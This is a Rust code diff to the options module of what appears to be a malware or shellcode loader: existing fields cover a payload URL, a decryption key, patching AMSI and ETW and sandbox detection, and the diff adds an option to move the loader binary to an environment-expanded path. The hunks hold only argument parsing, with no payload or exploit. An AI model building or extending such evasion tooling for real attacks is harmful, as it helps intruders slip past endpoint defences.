@@ -4,6 +4,7 @@ use std::fmt;
 use clap::ArgMatches;
 use std::error::Error;
 use std::option::Option;
+use crate::misc::expand_env_vars;
 
 /// Struct to store options 
 #[derive(Clone)]
@@ -13,7 +14,8 @@ pub struct LoaderOptions {
     patch_amsi: bool,
     patch_etw: bool,
     detect_sandbox: bool,
-    key: Option<String>
+    key: Option<String>,
+    move_location: Option<String>
 }
 
 /// Dictate how the contents of the struct will be printed
@@ -49,7 +51,13 @@ impl fmt::Display for LoaderOptions {
             }
             None => (),
         }
-            
+        
+        match &self.move_location {
+            Some(v) => {
+                msg = format!("{}[i] Move loader to:\t\t{}", msg, v);
+            }, 
+            None => (),
+        }
         write!(f,"{}",msg)
     }
 }
@@ -103,6 +111,13 @@ impl LoaderOptions {
         // Get Decreytion Key
         let key: Option<String> = cmds.get_one::<String>("dec_key").cloned();
 
+        // Check if binary is to be moved
+        let move_location = match cmds.get_one::<String>("move").cloned(){
+            Some(v) => expand_env_vars(v.as_str()).ok(),
+            None => None,
+        };
+
+
         // Put them all in a struct
         Ok(LoaderOptions {
             url,
@@ -110,7 +125,8 @@ impl LoaderOptions {
             patch_amsi,
             patch_etw,
             detect_sandbox,
-            key
+            key,
+            move_location
         })
     }
 }
